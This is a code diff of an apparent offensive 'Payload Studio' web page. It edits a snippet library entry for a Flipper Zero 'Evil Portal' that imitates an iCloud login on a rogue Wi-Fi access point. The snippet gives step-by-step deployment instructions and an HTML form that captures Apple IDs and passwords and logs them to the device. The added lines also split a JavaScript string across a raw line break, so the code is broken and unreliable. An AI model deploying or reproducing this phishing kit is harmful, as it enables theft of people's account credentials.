@@ -1,3 +1,9 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ERR0RS // Payload Studio</title>
 <style>
     :root {
       --void:      #04000a;
@@ -616,7 +622,8 @@ const SNIPPETS = {
       tags: ["evil portal", "ios", "icloud", "phishing", "captive portal"],
       desc: "Evil Portal template that mimics an iCloud login page. Deploy via Flipper WiFi board.",
       platform: "ios",
-      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form></body></html>",
+      code: "REM Evil Portal \u2014 iCloud login phishing page\nREM Deploy HTML file to Flipper Zero WiFi dev board\nREM See: /evil_portal/ directory for full HTML template\nREM\nREM SETUP:\nREM 1. Copy portal HTML to Flipper SD: apps_data/evil_portal/index.html\nREM 2. Enable Evil Portal in Flipper WiFi app\nREM 3. Target iOS device connects to rogue AP\nREM 4. Captive portal shows fake iCloud login\nREM 5. Credentials saved to Flipper SD log\nREM\nREM TEMPLATE:\nREM <!DOCTYPE html><html><head>
+<meta charset="UTF-8"><title>iCloud</title></head>\nREM <body><form action='/save' method='post'>\nREM <input name='user' placeholder='Apple ID'>\nREM <input name='pass' type='password' placeholder='Password'>\nREM <button type='submit'>Sign In</button></form></body></html>",
     },
     {
       id: "ios_mdm_profile_note",
